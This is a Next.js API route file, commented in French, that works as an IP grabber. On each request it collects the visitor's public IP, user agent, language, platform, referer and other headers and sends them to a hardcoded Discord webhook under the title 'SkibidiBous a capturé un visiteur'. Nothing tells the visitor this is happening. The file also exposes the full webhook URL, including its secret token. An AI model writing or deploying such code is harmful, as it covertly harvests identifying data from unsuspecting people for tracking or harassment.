import { NextRequest, NextResponse } from 'next/server';

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512503973398183956/xcdMQDj59ET0QO3wi7jo32bp5I2Hdwdieutk6iaOwevdfbNbQYB53EpyprWBDzSbi4xT';

export async function POST(request: NextRequest) {
  // Récupère l'IP publique (fonctionne parfaitement sur Vercel, donne ::1 seulement en local)
  const ip = request.headers.get('x-forwarded-for') || 
             request.headers.get('x-real-ip') || 
             '0.0.0.0';

  const headers = Object.fromEntries(request.headers.entries());
  
  // Prépare un superbe embed pour Discord (en français !)
  const embed = {
    title: "🔥 SkibidiBous a capturé un visiteur !",
    color: 0xff7a2f,
    fields: [
      { name: "🌐 IP publique", value: ip, inline: true },
      { name: "💻 Agent utilisateur", value: headers['user-agent'] || 'inconnu', inline: false },
      { name: "🗣️ Langue acceptée", value: headers['accept-language'] || 'inconnu', inline: true },
      { name: "🔧 Encodage accepté", value: headers['accept-encoding'] || 'inconnu', inline: true },
      { name: "📱 Sec-CH-UA", value: headers['sec-ch-ua'] || 'inconnu', inline: false },
      { name: "🖥️ Plateforme", value: headers['sec-ch-ua-platform'] || 'inconnu', inline: true },
      { name: "📲 Mobile ?", value: headers['sec-ch-ua-mobile'] === '?1' ? 'Oui' : 'Non', inline: true },
      { name: "🔗 Provenance (Referer)", value: headers['referer'] || 'direct', inline: false },
      { name: "⏰ Horodatage", value: new Date().toISOString(), inline: true },
    ],
    footer: { text: "SkibidiBous ON TOP" },
    timestamp: new Date().toISOString(),
  };

  const discordPayload = { embeds: [embed] };

  // Envoie vers le webhook Discord
  try {
    const res = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordPayload),
    });
    if (res.ok) {
      console.log('🟣 Webhook Bonzi livré à Discord !');
    } else {
      console.error(`Discord a répondu ${res.status} : ${await res.text()}`);
    }
  } catch (err) {
    console.error('Erreur du webhook Bonzi :', err);
  }

  return NextResponse.json({ message: "Bonzi a envoyé les données à Discord ! Trop génial !" });
}